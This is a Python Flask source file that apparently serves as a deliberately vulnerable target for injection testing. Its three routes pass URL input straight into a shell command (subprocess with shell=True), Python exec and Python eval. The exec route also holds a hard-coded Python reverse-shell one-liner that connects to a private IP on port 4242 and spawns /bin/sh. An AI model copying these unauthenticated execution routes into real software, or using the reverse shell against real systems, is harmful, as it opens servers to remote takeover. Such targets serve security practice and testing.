from flask import Flask
import subprocess
import os
import ftplib
from flask import request
from waitress import serve

app = Flask(__name__)

def run_cmd(cmd):
	return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/cmdinj/<cmd>')
def main(cmd):
	return run_cmd(cmd)
@app.route('/pyexecinj/<cmd>')
def pyexecinj(cmd):
	rev_shell = "export RHOST=\"192.168.201.204\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
	return exec(cmd)

@app.route('/pyevalinj/<cmd>')
def pyevalinj(cmd):
	return str(eval(cmd))

serve(app, port=8081, host='192.168.201.204')
